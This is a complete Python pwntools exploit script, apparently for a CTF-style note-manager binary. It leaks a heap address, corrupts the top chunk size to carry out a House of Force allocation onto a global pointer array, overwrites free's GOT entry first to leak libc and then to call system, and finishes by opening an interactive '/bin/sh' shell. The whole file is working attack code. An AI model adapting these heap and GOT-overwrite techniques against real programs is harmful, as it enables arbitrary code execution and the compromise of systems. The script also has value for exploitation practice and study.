from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample20')
p = process('./data/sample20')
free_got = elf.got['free']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
libc = elf.libc

def new_note(size, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'1')
    io.sendlineafter(b'Input the length of the note content:\n', str(size).encode())
    io.sendlineafter(b'Input the content:\n', content)
    io.recvline()

def edit_note(idx, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'3')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())
    io.sendlineafter(b'Input the new content:\n', content)
    io.recvline()

def del_note(idx, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'4')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())

p.sendafter(b'Input your name:\n', b'a' * 0x40);p.recvuntil(b'a' * 0x40);leak_heap_addr = u32(p.recvn(4))#step.1
p.sendafter(b'Org:\n', b'b' * 0x40);p.sendafter(b'Host:\n', p32(0xffffffff) + (0x40 - 4) * b'c');p.recvuntil(b'OKay! Enjoy:)\n')#step.2
top_chunk_addr = leak_heap_addr + 0xd0;ptr_array = 0x804b120;margin = ptr_array - top_chunk_addr;new_note(margin - 20, "")#step.3
new_note(0x40, b'aa');new_note(0x40, b'aa');new_note(0x40, b'aa');new_note(0x40, b'aa')#step.4
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))#step.5
edit_note(2, p32(puts_plt))#step.6
del_note(3)#step.7
msg = p.recvuntil(b'Delete success.\n');printf_addr = u32(msg[:4]);libc.address = printf_addr - libc.sym['printf']#step.8
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')#step.9
edit_note(2, p32(libc.sym['system']))#step.10
del_note(0)#step.11
p.interactive()